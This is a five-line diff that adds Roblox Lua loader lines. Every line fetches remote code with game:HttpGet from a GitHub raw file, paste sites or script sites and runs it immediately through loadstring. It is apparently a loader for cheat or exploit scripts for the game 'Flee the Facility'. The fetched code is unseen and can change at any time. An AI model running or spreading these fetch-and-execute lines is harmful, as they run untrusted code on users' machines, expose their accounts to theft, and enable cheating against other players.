@@ -1,0 +1,5 @@
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/actz2196/fortnite/main/FleeTheFacility.lua"), true))();
+loadstring(game:HttpGet("https://nns4.me/scripts/loader.lua"))();
+loadstring(game:HttpGet("https://rentry.co/9uqkr/raw"))();
+loadstring(game:HttpGet("https://paste.ee/r/Q2ekT/0"))();
+loadstring(game:HttpGet("https://gabescripts.com/access.lua"))();
